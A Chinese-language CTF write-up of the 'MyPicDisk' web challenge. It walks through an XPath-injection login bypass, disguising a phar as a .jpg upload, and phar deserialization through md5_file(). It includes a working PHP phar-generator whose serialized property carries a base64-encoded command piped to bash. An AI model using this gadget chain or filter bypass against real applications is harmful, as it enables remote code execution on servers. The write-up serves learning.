+++
title = 'DASCTF7月挑战赛MyPicDisk'
date = '2023-08-24T04:52:00+08:00'
categories = ['学习', '比赛']
tags = ['反序列化', 'rce', 'xpath', '注入', '伪协议']
+++

## 题目考点

### 1.phar反序列化

### 2.xpath注入

### 3.命令拼接

## 解题过程

### 1.获得源码

万能密码登录，在重定向页面发现源码。

![image-20230727164048078](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202307271640149.png)

### 2.分析代码

![image-20230727164115091](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202307271641133.png)

先看这一部分，当$result为真且session存在，会提示登录成功，用户名和密码通过xpath语法进行查询，我们可以通过xpath注入绕过，也就是第一步的万能密码登录。

这里可以通过xxe盲打将账号密码得出，但这里还不太会。

![image-20230727164126612](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202307271641643.png)

这里通过判断是不是admin，如果不是就删除会话，前面大概判断逻辑就是，如果session不存在重定向到登录界面，如果session存在，可以往下操作。

因为我这里是没得到账号和密码，不过这题可以通过要往下操作时再发一遍登录的包进行一个session的存在。

![image-20230727164140403](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202307271641435.png)

这部分实现了一个上传文件的功能，结合前面的逻辑，也就是当sesison存在时，我们可以进行一个文件的上传，这里对文件类型进行了判断，

![image-20230727164148419](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202307271641453.png)

最后一部分，有个echo md5_file($filename);可以使用伪协议

再看FILE类

![image-20230727164157563](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202307271641599.png)

可以看到最后我们可以进行命令拼接

### 3.解题思路

通过文件上传phar文件然后通过md5_file()用phar协议去读phar文件，在生成phar中拼接命令，但这里对拼接的命令进行了过滤，可以通过base64加密再解密绕过。

#### 生成phar文件

```
<?php
class FILE{
    public $filename=";echo Y2F0IC9hZGphc2tkaG5hc2tfZmxhZ19pc19oZXJlX2Rha2pkbm1zYWtqbmZrc2Q=|base64 -d|bash -i>1.txt";
    public $lasttime;
    public $size;
}

$phar = new Phar("bb.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");

$aa = new FILE();
$phar->setMetadata($aa);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
```

#### 上传phar文件

因为对上传文件进行了限制，这里改为.jpg文件上传。

![image-20230727164215509](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202307271642567.png)

#### 访问phar文件

这里图片上传成功，通过phar协议去访问文件，

![image-20230727164226396](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202307271642461.png)

#### 访问写入文件

执行成功,访问写入flag的文件。

![image-20230727164241019](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202307271642046.png)

## 总结

md5_file()这个点可以使用伪协议第一次知道，phar反序列化还需要深入的理解，代码的一个分析能力需要提升，思路的发散性，当时做题就因为session的检查就往下走不动了。
